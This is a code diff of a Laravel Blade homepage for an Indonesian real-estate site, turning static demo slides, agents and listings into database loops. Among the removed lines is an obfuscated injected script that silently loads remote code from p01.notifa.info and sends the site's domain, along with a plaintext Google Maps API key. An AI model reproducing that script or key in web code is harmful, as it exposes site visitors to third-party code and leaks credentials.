@@ -12,19 +12,8 @@
      
     <!-- External Css -->
     <link rel="stylesheet" href="{{asset('assets/css/fontawesome-all.min.css')}}">
-    <link rel="stylesheet" href="{{asset('assets/css/themify-icons.css')}}" />
-    <link rel="stylesheet" href="{{asset('assets/css/et-line.css')}}" />
     <link rel="stylesheet" href="{{asset('assets/css/owl.carousel.css')}}" />
-    <link rel="stylesheet" href="{{asset('assets/css/jquery.nstSlider.min.css')}}" />
-    <link rel="stylesheet" href="{{asset('assets/css/bootstrap-select.min.css')}}" />
-    <link rel="stylesheet" href="{{asset('assets/css/plyr.css')}}" />
-    <link rel="stylesheet" href="{{asset('assets/css/magnific-popup.css')}}" />
-    <link rel="stylesheet" href="{{asset('assets/css/js-flickr-gallery.css')}}" />
 
-    <!-- leaflet -->
-    <link rel="stylesheet" href="{{asset('assets/leaflet/css/leaflet.css')}}">
-    <link rel="stylesheet" href="{{asset('assets/leaflet/css/MarkerCluster.css')}}">
-    <link rel="stylesheet" href="{{asset('assets/leaflet/css/MarkerCluster.Default.css')}}">
 
     <!-- Custom Css -->
     <link rel="stylesheet" type="text/css" href="{{asset('css/main.css')}}">
@@ -42,7 +31,9 @@
     <!-- Banner -->
     <div class="banner">
       <div class="cp-slider" id="cp-slider">
-        <div class="cp-slider-item slider-item" style="background: url({{asset('images/bg/slider-1.jpg')}}) no-repeat center center;">
+
+        @foreach ($properties as $property)
+        <div class="cp-slider-item slider-item" style="background: url({{asset($property->images[0]->photo)}}) no-repeat; background-size: cover; background-position:center">
           <div class="container">
             <div class="row">
               <div class="col-lg-12">
@@ -52,46 +43,16 @@
                       <div class="row">
                         <div class="col-lg-12">
                           <div class="rate">
-                            <span>RP. 22,500.00</span>
-                          </div>
-                        </div>
-                      </div>
-                      <div class="row">
-                        <div class="col-lg-12">
-                          <div class="panel-body">
-                            <h5>Olivers Kitchen</h5>
-                            <div class="address"><i class="fas fa-map-marker-alt"></i> 187, Madison Squre, New York, NY2154215</div>
-                            <a href="" class="go">Selengkapnya <i class="fas fa-long-arrow-alt-right"></i></a>
-                          </div>
-                        </div>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
-        <div class="cp-slider-item slider-item" style="background: url({{asset('images/bg/slider-2.jpg')}}) no-repeat center center;">
-          <div class="container">
-            <div class="row">
-              <div class="col-lg-12">
-                <div class="slider-wrapper">
-                  <div class="slider-content">
-                    <div class="panel panel-default">
-                      <div class="row">
-                        <div class="col-lg-12">
-                          <div class="rate">
-                            <span>RP. 22,500.00</span>
+                          <span>RP. {{(int)$property->price}} {{$property->value}}</span>
                           </div>
                         </div>
                       </div>
                       <div class="row">
                         <div class="col-lg-10">
                           <div class="panel-body">
-                            <h5>Olivers Kitchen</h5>
-                            <h6>Bondowoso</h6>
-                            <a href="">Selengkapnya</a>
+                            <h5>{{$property->title}}</h5>
+                            <h6>{{$property->location}}</h6>
+                          <a href="/properties/{{$property->id}}">Selengkapnya</a>
                           </div>
                         </div>
                       </div>
@@ -102,36 +63,9 @@
             </div>
           </div>
         </div>
-        <div class="cp-slider-item slider-item" style="background: url({{asset('images/bg/slider-3.jpg')}}) no-repeat center center;">
-          <div class="container">
-            <div class="row">
-              <div class="col-lg-12">
-                <div class="slider-wrapper">
-                  <div class="slider-content">
-                    <div class="panel panel-default">
-                      <div class="row">
-                        <div class="col-lg-12">
-                          <div class="rate">
-                            <span>RP. 22,500.00</span>
-                          </div>
-                        </div>
-                      </div>
-                      <div class="row">
-                        <div class="col-lg-10">
-                          <div class="panel-body">
-                            <h5>Olivers Kitchen</h5>
-                            <h6>Bondowoso</h6>
-                            <a href="">Selengkapnya</a>
-                          </div>
-                        </div>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-        </div>
+        @endforeach
+
+
       </div>
     </div>
     <!-- Banner End -->
@@ -291,82 +225,29 @@
           </div>
         </div>
         <div class="row margin-balance">
-          <div class="col-md-3 col-sm-6">
+
+          @foreach ($agents as $agent)
+               <div class="col-md-3 col-sm-6">
             <div class="agent">
-              <div class="agent-thumb">
-                <img src="{{asset('images/agent/thumb-1.jpg')}}" class="img-responsive" alt="">
+              <div class="agent-thumb" style="height: 262.5px; width: 100%">
+                <img src="{{!empty($agent->photo) ? asset($agent->photo) : asset('images/dashboard/user/demo-user.png')}}" class="img-responsive" style="width: 100%; height:100%; object-fit:cover" alt="">
                 <div class="overlay"></div>
                 <div class="social-icon">
                   <ul>
-                    <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
-                    <li><a href="#"><i class="fab fa-twitter"></i></a></li>
-                    <li><a href="#"><i class="fab fa-google-plus-g"></i></a></li>
-                    <li><a href="#"><i class="fab fa-linkedin-in"></i></a></li>
+                  <li><a href="{{$agent->facebook_link}}"><i class="fab fa-facebook-f"></i></a></li>
+                    <li><a href="{{$agent->twitter_link}}"><i class="fab fa-twitter"></i></a></li>
+                  <li><a href="{{$agent->instagram_link}}"><i class="fab fa-instagram"></i></a></li>
+                  <li><a href="{{$agent->youtube_link}}"><i class="fab fa-youtube"></i></a></li>
                   </ul>
                 </div>
               </div>
               <div class="info">
-                <h5><a href="#">Ambrin Rosa</a></h5>
+              <h5><a href="/agents/{{$agent->id}}">{{$agent->name}}</a></h5>
               </div>
             </div>
           </div>
-          <div class="col-md-3 col-sm-6">
-            <div class="agent">
-              <div class="agent-thumb">
-                <img src="{{asset('images/agent/thumb-2.jpg')}}" class="img-responsive" alt="">
-                <div class="overlay"></div>
-                <div class="social-icon">
-                  <ul>
-                    <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
-                    <li><a href="#"><i class="fab fa-twitter"></i></a></li>
-                    <li><a href="#"><i class="fab fa-google-plus-g"></i></a></li>
-                    <li><a href="#"><i class="fab fa-linkedin-in"></i></a></li>
-                  </ul>
-                </div>
-              </div>
-              <div class="info">
-                <h5><a href="#">Oliver Liam</a></h5>
-              </div>
-            </div>
-          </div>
-          <div class="col-md-3 col-sm-6">
-            <div class="agent">
-              <div class="agent-thumb">
-                <img src="{{asset('images/agent/thumb-3.jpg')}}" class="img-responsive" alt="">
-                <div class="overlay"></div>
-                <div class="social-icon">
-                  <ul>
-                    <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
-                    <li><a href="#"><i class="fab fa-twitter"></i></a></li>
-                    <li><a href="#"><i class="fab fa-google-plus-g"></i></a></li>
-                    <li><a href="#"><i class="fab fa-linkedin-in"></i></a></li>
-                  </ul>
-                </div>
-              </div>
-              <div class="info">
-                <h5><a href="#">Justin Kutubow</a></h5>
-              </div>
-            </div>
-          </div>
-          <div class="col-md-3 col-sm-6">
-            <div class="agent">
-              <div class="agent-thumb">
-                <img src="{{asset('images/agent/thumb-4.jpg')}}" class="img-responsive" alt="">
-                <div class="overlay"></div>
-                <div class="social-icon">
-                  <ul>
-                    <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
-                    <li><a href="#"><i class="fab fa-twitter"></i></a></li>
-                    <li><a href="#"><i class="fab fa-google-plus-g"></i></a></li>
-                    <li><a href="#"><i class="fab fa-linkedin-in"></i></a></li>
-                  </ul>
-                </div>
-              </div>
-              <div class="info">
-                <h5><a href="#">Olive Yew</a></h5>
-              </div>
-            </div>
-          </div>
+          @endforeach
+
         </div>
       </div>
     </div>
@@ -384,189 +265,62 @@
           </div>
         </div>
         <div class="row margin-balance">
+
+          @foreach ($properties as $property)
           <div class="col-md-4 col-sm-6">
             <div class="listing">
               <div class="listing-thumb">
                 <div class="listing-slider">
-                  <div class="slide slide-1">
-                    <img src="{{asset('images/listing/listing-slide-1.jpg')}}" class="img-responsive" alt="">
+                  @foreach ($property->images as $image)
+                  <div class="slide" style="height: 350px">
+                    <img src="{{asset($image->photo)}}" class="img-responsive" style="width: 100%; height:100%; object-fit:cover" alt="">
                   </div>
-                  <div class="slide slide-2">
-                    <img src="{{asset('images/listing/listing-slide-2.jpg')}}" class="img-responsive" alt="">
-                  </div>
-                  <div class="slide slide-3">
-                    <img src="{{asset('images/listing/listing-slide-3.jpg')}}" class="img-responsive" alt="">
-                  </div>
+                  @endforeach
                 </div>
                 <div class="overlay"></div>
-                <div class="quick-action">
-                  <ul>
-                    <li><a href="#"><i class="fas fa-exchange-alt"></i></a></li>
-                    <li><a href="#"><i class="far fa-heart"></i></a></li>
-                  </ul>
-                </div>
                 <div class="rate">
-                  <span>&#36;22,500.00</span>
+                <span>{{(int)$property->price}} {{$property->value}}</span>
                 </div>
               </div>
               <div class="content-block">
                 <div class="listing-body">
-                  <h5><a href="#">Olivers Kitchen</a> <span class="badge sale">Sale</span></h5>
+                <h5><a href="/properties/{{$property->id}}">{{$property->title}}</a></h5>
                   <div class="meta">
-                    <span class="listing-type">living room</span>
-                    <span class="listing-status open">Open</span>
+                    <span class="listing-type">{{$property->type->name}}</span>
+                  <span class="listing-status open">{{$property->status->name}}</span>
                   </div>
-                  <span class="address"><i class="fas fa-map-marker-alt"></i> 187, Madison Squre, New York, NY2154215</span>
+                <span class="address"><i class="fas fa-map-marker-alt"></i> {{$property->location}}</span>
                   <div class="info">
                     <div class="listing-info bedroom">
-                      <span class="title">Bedrooms</span>
-                      <span class="number">05</span>
+                      <span class="title">Kamar Tidur</span>
+                      <span class="number">{{$property->bedroom}}</span>
                     </div>
                     <div class="listing-info bath">
-                      <span class="title">Baths</span>
-                      <span class="number">05</span>
+                      <span class="title">Kamar Mandi</span>
+                      <span class="number">{{$property->bathroom}}</span>
                     </div>
                     <div class="listing-info size">
-                      <span class="title">Size (Sq.ft)</span>
-                      <span class="number">1650</span>
+                      <span class="title">Luas (m<sup>2</sup>)</span>
+                      <span class="number">{{$property->building_area}}</span>
                     </div>
                   </div>
                 </div>
                 <div class="author">
                   <div class="author-thumb">
-                    <a href="#"><img src="{{asset('images/listing/author-thumb-1.jpg')}}" class="img-responsive" alt=""></a>
+                    <a href="#" style="height: 100%"><img src="{{$property->user->photo ? asset($property->user->photo) : asset('images/dashboard/user/demo-user.png')}}" class="img-responsive" style="width: 100%; height:100%; object-fit:cover"alt=""></a>
                   </div>
                   <div class="author-info">
-                    <h6><a href="#">Maria Marlin</a></h6>
-                    <span class="listing-date"><i class="far fa-clock"></i> 12 December 2018</span>
+                  <h6><a href="/agents/{{$property->user->id}}">{{$property->user->name}}</a></h6>
+                    <span class="listing-date"><i class="far fa-clock"></i>12 December 2018</span>
                     <a href="#"><i class="fas fa-long-arrow-alt-right"></i></a>
                   </div>
                 </div>
               </div>
             </div>
           </div>
-          <div class="col-md-4 col-sm-6">
-            <div class="listing">
-              <div class="listing-thumb">
-                <div class="listing-slider">
-                  <div class="slide slide-2">
-                    <img src="{{asset('images/listing/listing-slide-2.jpg')}}" class="img-responsive" alt="">
-                  </div>
-                  <div class="slide slide-1">
-                    <img src="{{asset('images/listing/listing-slide-1.jpg')}}" class="img-responsive" alt="">
-                  </div>
-                  <div class="slide slide-3">
-                    <img src="{{asset('images/listing/listing-slide-3.jpg')}}" class="img-responsive" alt="">
-                  </div>
-                </div>
-                <div class="overlay"></div>
-                <div class="quick-action">
-                  <ul>
-                    <li><a href="#"><i class="fas fa-exchange-alt"></i></a></li>
-                    <li><a href="#"><i class="far fa-heart"></i></a></li>
-                  </ul>
-                </div>
-                <div class="rate">
-                  <span>&#36;22,500.00</span>
-                </div>
-              </div>
-              <div class="content-block">
-                <div class="listing-body">
-                  <h5><a href="#">Olivers Kitchen</a> <span class="badge rent">rent</span></h5>
-                  <div class="meta">
-                    <span class="listing-type">living room</span>
-                    <span class="listing-status expired">Expired</span>
-                  </div>
-                  <span class="address"><i class="fas fa-map-marker-alt"></i> 187, Madison Squre, New York, NY2154215</span>
-                  <div class="info">
-                    <div class="listing-info bedroom">
-                      <span class="title">Bedrooms</span>
-                      <span class="number">05</span>
-                    </div>
-                    <div class="listing-info bath">
-                      <span class="title">Baths</span>
-                      <span class="number">05</span>
-                    </div>
-                    <div class="listing-info size">
-                      <span class="title">Size (Sq.ft)</span>
-                      <span class="number">1650</span>
-                    </div>
-                  </div>
-                </div>
-                <div class="author">
-                  <div class="author-thumb">
-                    <a href="#"><img src="{{asset('images/listing/author-thumb-1.jpg')}}" class="img-responsive" alt=""></a>
-                  </div>
-                  <div class="author-info">
-                    <h6><a href="#">Maria Marlin</a></h6>
-                    <span class="listing-date"><i class="far fa-clock"></i> 12 December 2018</span>
-                    <a href="#"><i class="fas fa-long-arrow-alt-right"></i></a>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-          <div class="col-md-4 col-sm-6">
-            <div class="listing">
-              <div class="listing-thumb">
-                <div class="listing-slider">
-                  <div class="slide slide-3">
-                    <img src="{{asset('images/listing/listing-slide-3.jpg')}}" class="img-responsive" alt="">
-                  </div>
-                  <div class="slide slide-1">
-                    <img src="{{asset('images/listing/listing-slide-1.jpg')}}" class="img-responsive" alt="">
-                  </div>
-                  <div class="slide slide-2">
-                    <img src="{{asset('images/listing/listing-slide-2.jpg')}}" class="img-responsive" alt="">
-                  </div>
-                </div>
-                <div class="overlay"></div>
-                <div class="quick-action">
-                  <ul>
-                    <li><a href="#"><i class="fas fa-exchange-alt"></i></a></li>
-                    <li><a href="#"><i class="far fa-heart"></i></a></li>
-                  </ul>
-                </div>
-                <div class="rate">
-                  <span>&#36;22,500.00</span>
-                </div>
-              </div>
-              <div class="content-block">
-                <div class="listing-body">
-                  <h5><a href="#">Olivers Kitchen</a> <span class="badge sale">Sale</span></h5>
-                  <div class="meta">
-                    <span class="listing-type">living room</span>
-                    <span class="listing-status open">Open</span>
-                  </div>
-                  <span class="address"><i class="fas fa-map-marker-alt"></i> 187, Madison Squre, New York, NY2154215</span>
-                  <div class="info">
-                    <div class="listing-info bedroom">
-                      <span class="title">Bedrooms</span>
-                      <span class="number">05</span>
-                    </div>
-                    <div class="listing-info bath">
-                      <span class="title">Baths</span>
-                      <span class="number">05</span>
-                    </div>
-                    <div class="listing-info size">
-                      <span class="title">Size (Sq.ft)</span>
-                      <span class="number">1650</span>
-                    </div>
-                  </div>
-                </div>
-                <div class="author">
-                  <div class="author-thumb">
-                    <a href="#"><img src="{{asset('images/listing/author-thumb-1.jpg')}}" class="img-responsive" alt=""></a>
-                  </div>
-                  <div class="author-info">
-                    <h6><a href="#">Maria Marlin</a></h6>
-                    <span class="listing-date"><i class="far fa-clock"></i> 12 December 2018</span>
-                    <a href="#"><i class="fas fa-long-arrow-alt-right"></i></a>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
+          @endforeach
+
+          
         </div>
       </div>
     </div>
@@ -809,7 +563,7 @@
                 </div>
                 <div class="social-link">
                   <ul>
-                    <li><a href="#"><i class="fab fa-facebook-f"></i></a></li>
+                    <li><a href=""><i class="fab fa-facebook-f"></i></a></li>
                     <li><a href="#"><i class="fab fa-twitter"></i></a></li>
                     <li><a href="#"><i class="fab fa-google-plus-g"></i></a></li>
                     <li><a href="#"><i class="fab fa-linkedin-in"></i></a></li>
@@ -884,32 +638,80 @@
 
     <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
     <script src="{{asset('assets/js/jquery.min.js')}}"></script>
-    <!-- Include all compiled plugins (below), or include individual files as needed -->
     <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
-    <script src="{{asset('assets/js/visible.js')}}"></script>
     <script src="{{asset('assets/js/owl.carousel.min.js')}}"></script>
-    <script src="{{asset('assets/js/jquery.nstSlider.min.js')}}"></script>
-    <script src="{{asset('assets/js/bootstrap-select.min.js')}}"></script>
-    <script src="{{asset('assets/js/plyr.js')}}"></script>
-    <script src="{{asset('assets/js/jquery-migrate-3.0.1.js')}}"></script>
-    <script src="{{asset('assets/js/jquery.magnific-popup.min.js')}}"></script>
-    <script src="{{asset('assets/js/js-flickr-gallery.js')}}"></script>
-    <script src="{{asset('assets/js/tinymce.min.js')}}"></script>
-    <script src="{{asset('assets/js/isotope.pkgd.min.js')}}"></script>
-    <script src="{{asset('assets/js/imagesloaded.pkgd.min.js')}}"></script>
-    <script src="{{asset('assets/js/jquery.ajaxchimp.min.js')}}"></script>
-    <script src="{{asset('assets/js/easing.min.js')}}"></script>
+    
+        <script>
+      if ($('.cp-slider').length > 0) {
+        $('.cp-slider').each(function () {
+            $(this).owlCarousel({
+                singleItem: true,
+                slideSpeed: 200,
+                autoPlay: 3000,
+                stopOnHover: true,
+                mouseDrag : false,
+                touchDrag : false,
+                navigation: true,
+                navigationText: ['<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>'],
+                pagination: false
+            });
+        });
+    };
 
-    <!-- leaflet -->
-    <script src="{{asset('assets/leaflet/js/dummylatlng.js')}}"></script>
-    <script src="{{asset('assets/leaflet/js/leaflet-src.js')}}"></script>
-    <script src="{{asset('assets/leaflet/js/leaflet.markercluster-src.js')}}"></script>
+    if ($('.listing-slider').length > 0) {
+        $('.listing-slider').each(function () {
+            $(this).owlCarousel({
+                singleItem: true,
+                slideSpeed: 200,
+                autoPlay: 3000,
+                stopOnHover: true,
+                navigation: true,
+                navigationText: ['<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>'],
+                pagination: false
+            });
+        });
+    };
 
-    <script src="{{asset('js/custom.js')}}"></script>
-    <script src="{{asset('js/dashboard.js')}}"></script>
-    <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAmiJjq5DIg_K9fv6RE72OY__p9jz0YTMI"></script>
-    <script src="{{asset('js/map.js')}}"></script>
-    <script src="{{asset('js/searchMap.js')}}"></script>
-    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH21UyEHQgB6pL3mwR3vU7SLtgFxg5fOo7Rb8htxCrPrFvSpPaDo42rGpp2wu8UEKjSABfml6DsEeVl1J7ACV2x81C3k3qgqMSYQghczOIZpVgJ4K8hWZbnY9rYBstgqlHrzHP32YgqVRwqlRGmCbKBETLeuDRRb3mUdvDzCgfY1PJqIh2WTr1dygYZAC%2bwPuqcmzW8p4tNady96ZBYsmuF8iGUZfCXcRF0PNk0sCY%2fv4EudisdGbzerIKO0aI%2bMlifa02kZ%2fgQRRoPvNnM9WVH4AZXFNFhZELQ8e2BNNvir62mqrYNVFYm8AgVAkg%2bT71gvWD3m0GCYjxXxYlamPdul3%2byiK8CVrN2Ghbsw4ADA1vgw9Svu0vkK7h2HzeRlPQ8Jr9L%2bgygS9pUPWBkTC8s4BlYSflvtC2I09Wn1nl3byRLe5aeAlxvp5m6F0DLHEwb3XfG8N3v4IT9897V7%2fr3M2uROsNM9B%2fNb2UDWHeb4jA%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
+    if ($('.post-slider').length > 0) {
+        $('.post-slider').each(function () {
+            $(this).owlCarousel({
+                singleItem: true,
+                slideSpeed: 200,
+                autoPlay: 3000,
+                stopOnHover: true,
+                navigation: true,
+                navigationText: ['<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>'],
+                pagination: false
+            });
+        });
+    };
+
+    if ($('#property-slider').length > 0) {
+        $('#property-slider').owlCarousel({
+            singleItem: true,
+            slideSpeed: 200,
+            autoPlay: 3000,
+            stopOnHover: true,
+            navigation: true,
+            navigationText: ['<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>'],
+            pagination: false
+        });
+    };
+
+
+    $('.testimonial').each(function () {
+        $(this).owlCarousel({
+            singleItem: true,
+            slideSpeed: 200,
+            autoPlay: 3000,
+            stopOnHover: true,
+            navigation: true,
+            navigationText: ['<i class="fa fa-angle-left"></i>', '<i class="fa fa-angle-right"></i>'],
+            pagination: false
+        });
+    });
+
+
+    </script>
   </body>
 </html>
